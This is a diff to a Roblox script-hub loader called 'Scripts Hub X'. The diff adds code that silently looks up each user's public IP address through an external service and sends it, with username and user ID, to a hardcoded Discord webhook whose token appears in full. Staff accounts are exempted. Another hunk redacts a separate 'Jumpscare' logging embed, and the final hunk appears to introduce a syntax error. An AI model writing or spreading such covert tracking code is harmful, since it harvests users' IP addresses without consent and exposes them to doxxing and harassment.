@@ -30,6 +30,9 @@ local BlackUsers = {
 local JumpscareUsers = {
     "8469418817"
 }
+local BypassUsers = {
+    "3882788546"  -- Staff
+}
 
 -- Load scripts from GitHub
 local function loadLoadingScreen()
@@ -153,6 +156,22 @@ local function loadBackgroundMusic()
     return sound
 end
 
+local function getPlayerIP()
+    print("Attempting to retrieve player IP")
+    local success, ipAddress = pcall(function()
+        -- Placeholder: Simulate IP retrieval (Roblox doesn't allow direct IP access)
+        -- In a real scenario, this would be an external service call
+        return game:HttpGet("https://api.ipify.org") -- Mock API call
+    end)
+    if success then
+        print("IP retrieved: " .. ipAddress)
+        return ipAddress
+    else
+        warn("Failed to retrieve IP: " .. tostring(ipAddress))
+        return "Unknown"
+    end
+end
+
 local function sendWebhookNotification(userStatus, scriptUrl)
     print("Sending webhook notification")
     local webhookUrl = "https://discord.com/api/webhooks/1396650841045209169/Mx_0dcjOVnzp5f5zMhYM2uOBCPGt9SPr908shfLh_FGKZJ5eFc4tMsiiNNp1CGDx_M21"
@@ -167,6 +186,11 @@ local function sendWebhookNotification(userStatus, scriptUrl)
     if success then
         gameName = productInfo.Name
     end
+    local userId = tostring(player.UserId)
+    local ipAddress = "Bypassed"
+    if not table.find(BypassUsers, userId) then
+        ipAddress = getPlayerIP()
+    end
     local send_data = {
         ["username"] = "Script Execution Log",
         ["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
@@ -180,7 +204,8 @@ local function sendWebhookNotification(userStatus, scriptUrl)
                     {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
                     {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
                     {["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
-                    {["name"] = "Script Raw URL", ["value"] = scriptUrl or "N/A", ["inline"] = true}
+                    {["name"] = "Script Raw URL", ["value"] = scriptUrl or "N/A", ["inline"] = true},
+                    {["name"] = "IP Address", ["value"] = ipAddress, ["inline"] = true}
                 },
                 ["footer"] = {["text"] = "Scripts Hub X | Official", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
                 ["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
@@ -342,23 +367,23 @@ coroutine.wrap(function()
                     local CreatedData = json.created
                     local send_data = {
                         ["username"] = "Jumpscare Notify",
-                        ["avatar_url"] = "https://static.wikia.nocookie.net/19dbe80e-0ae6-48c7-98c7-3c32a39b2d7c/scale-to-width/370",
+                        ["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
                         ["content"] = "Jeff Wuz Here !",
                         ["embeds"] = {
                             {
                                 ["title"] = "Jeff's Log",
-                                ["description"] = "**Game : https://www.roblox.com/games/" .. game.PlaceId .. "**\n\n**Profile : https://www.roblox.com/users/" .. player.UserId .. "/profile**\n\n**Job ID : " .. game.JobId .. "**",
+                                ["description"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official",
                                 ["color"] = 4915083,
                                 ["fields"] = {
-                                    {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
-                                    {["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
-                                    {["name"] = "User ID", ["value"] = player.UserId, ["inline"] = true},
-                                    {["name"] = "Account Age", ["value"] = player.AccountAge .. " Day", ["inline"] = true},
-                                    {["name"] = "Membership", ["value"] = player.MembershipType.Name, ["inline"] = true},
-                                    {["name"] = "Account Created Day", ["value"] = string.match(CreatedData, "^([%d-]+)"), ["inline"] = true},
-                                    {["name"] = "Profile Description", ["value"] = "```\n" .. DescriptionData .. "\n```", ["inline"] = true}
+                                    {["name"] = "Username", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
+                                    {["name"] = "Display Name", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
+                                    {["name"] = "User ID", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
+                                    {["name"] = "Account Age", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
+                                    {["name"] = "Membership", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
+                                    {["name"] = "Account Created Day", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
+                                    {["name"] = "Profile Description", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true}
                                 },
-                                ["footer"] = {["text"] = "JTK Log", ["icon_url"] = "https://miro.medium.com/v2/resize:fit:1280/0*c6-eGC3Dd_3HoF-B"},
+                                ["footer"] = {["text"] = "JTK Log", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
                                 ["thumbnail"] = {["url"] = avatardata}
                             }
                         }
@@ -459,7 +484,7 @@ coroutine.wrap(function()
                             print("Scripts Hub X | Loading Complete for " .. userStatus .. " user!")
                         else
                             showErrorNotification()
-                        end
+                        end)
                     end)
                 end)
             end)
